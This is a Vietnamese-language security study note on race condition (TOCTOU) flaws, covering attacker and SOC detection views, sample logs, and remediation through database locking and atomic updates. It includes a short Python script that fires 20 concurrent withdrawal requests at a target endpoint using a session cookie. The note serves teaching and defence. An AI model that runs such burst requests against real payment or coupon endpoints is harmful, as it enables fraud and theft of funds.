# Race Conditions

## 1. Concept

**Race Condition (Lỗi tương tranh)** xảy ra khi một hệ thống đa luồng (Multi-threading) cố gắng thực hiện nhiều tác vụ cùng lúc trên một tài nguyên dùng chung, nhưng trình tự thực hiện không được kiểm soát chặt chẽ.

* **ELI5:** Hãy tưởng tượng hai người cùng dùng một thẻ ATM để rút sạch số dư 1 triệu đồng tại hai máy khác nhau vào **cùng một giây**. Nếu hệ thống không "khóa" tài khoản kịp thời, cả hai máy đều thấy số dư là 1 triệu và cùng nhả tiền. Kết quả: Bạn rút được 2 triệu từ tài khoản chỉ có 1 triệu.
* **Ví dụ thực tế:** Áp dụng mã giảm giá (Coupon) nhiều lần cho một đơn hàng, rút tiền vượt quá số dư, hoặc đăng ký trùng một tên người dùng duy nhất.

## 2. Key Mechanism

Lỗ hổng này chủ yếu dựa trên nguyên lý **TOCTOU (Time-of-Check to Time-of-Use)**:

1. **Time-of-Check (Thời điểm kiểm tra):** Luồng 1 kiểm tra điều kiện (vd: Mã giảm giá này đã dùng chưa? -> Chưa).
2. **Window of Opportunity (Khe hở cơ hội):** Trước khi Luồng 1 kịp đánh dấu "Đã dùng", Luồng 2 cũng nhảy vào kiểm tra điều kiện (Mã này dùng chưa? -> Vẫn chưa, vì Luồng 1 đang xử lý chưa xong).
3. **Time-of-Use (Thời điểm sử dụng):** Cả hai luồng đều thấy điều kiện hợp lệ và cùng thực hiện hành động (Áp mã giảm giá 2 lần).

**Kiến trúc ảnh hưởng:**

* **Multi-threading:** Ứng dụng hiện đại chạy nhiều luồng song song (Parallel) để tăng tốc độ.
* **3-Tier Architecture:** Sự trễ nhịp (Latency) khi dữ liệu truyền từ **Presentation Tier** (Giao diện) -> **Application Tier** (Logic) -> **Data Tier** (Database) tạo ra "khe hở" thời gian để hacker chèn các yêu cầu dồn dập.

## 3. Security Perspective&#x20;

### 🔴 Attacker View (Red Team)

Hacker không thực hiện thủ công mà dùng công cụ để tạo ra các **"Turbo Requests"**:

* **Kỹ thuật Burst Attack:** Sử dụng các công cụ như **Burp Suite (Turbo Intruder)** hoặc script Python để gửi hàng trăm Request giống hệt nhau tới Server chỉ trong vài mili-giây (ms).
* **Mục tiêu:** Nhắm vào các Endpoint thay đổi trạng thái nhạy cảm (State-changing APIs) như /withdraw, /transfer, /redeem-coupon, /upvote.

### 🔵 Defender View (Blue Team/SOC)

Lỗ hổng này là "vô hình" đối với các bộ lọc Signature (vì gói tin hoàn toàn hợp lệ). SOC Analyst cần dựa vào **Phân tích tần suất và Logic**:

* **Dấu hiệu nhận biết (SOC Alert):**
  * **High-Frequency Bursts:** Một địa chỉ IP hoặc Session ID gửi 20-50 yêu cầu POST/PUT giống hệt nhau trong khoảng thời gian < 100ms.
  * **Database Deadlock Logs:** Hệ thống ghi lại các lỗi tranh chấp dữ liệu (Deadlock found, Lock wait timeout exceeded) liên tục. Đây là dấu hiệu của việc nhiều luồng đang "đánh nhau" để ghi dữ liệu.
  * **Logic Inconsistency:** Database ghi nhận số dư âm hoặc một Coupon được dùng 5 lần cho 1 đơn hàng mà không có lỗi hệ thống nào chặn lại.
* **Giả lập dòng Log điển hình (Web Server Log):**

```
# SOC thấy cùng 1 Session ID gửi 3 request áp mã giảm giá trong cùng 1 mili-giây
[21/May/2024:20:00:00.001] "POST /api/coupon/apply HTTP/1.1" 200 (SessionID: A1B2)
[21/May/2024:20:00:00.001] "POST /api/coupon/apply HTTP/1.1" 200 (SessionID: A1B2)
[21/May/2024:20:00:00.001] "POST /api/coupon/apply HTTP/1.1" 200 (SessionID: A1B2)
=> ALERT: Potential Race Condition Attack. Identical timestamps for state-changing request.
```

## 4. Useful Commands

### 🛠️ Giả lập tấn công Race Condition (Python)

Hacker thường dùng thư viện threading để gửi yêu cầu đồng thời:

```python
import threading
import requests

url = "http://target.com/api/withdraw"
cookies = {"session": "hacker-session-id"}
data = {"amount": 100}

def send_request():
    # Gửi yêu cầu rút tiền dồn dập
    response = requests.post(url, cookies=cookies, json=data)
    print(f"Status: {response.status_code}, Body: {response.text}")

# Tạo 20 luồng chạy cùng lúc
for i in range(20):
    t = threading.Thread(target=send_request)
    t.start()
```

### 🔒 Giải pháp phòng vệ (Remediation)

Để giúp Dev vá lỗi, SOC Mentor đề xuất:

1. **Database Locking:** Sử dụng lệnh SELECT ... FOR UPDATE trong SQL để khóa dòng dữ liệu ngay khi bắt đầu kiểm tra.
2. **Atomic Operations:** Sử dụng các toán tử nguyên tử (vd: UPDATE accounts SET balance = balance - 100 WHERE id = 1 AND balance >= 100).
3. **Synchronization:** Sử dụng Mutex hoặc Semaphore trong code ứng dụng để bắt các luồng phải xếp hàng (Serializing).

### 🔎 Câu lệnh kiểm tra Process/Threads cho SOC

```bash
# Xem các luồng (threads) của một tiến trình đang chạy trên Linux
ps -T -p <PID>

# Giám sát các lỗi Deadlock trong MySQL
mysql -e "SHOW ENGINE INNODB STATUS\G" | grep -i "LATEST DETECTED DEADLOCK"
```
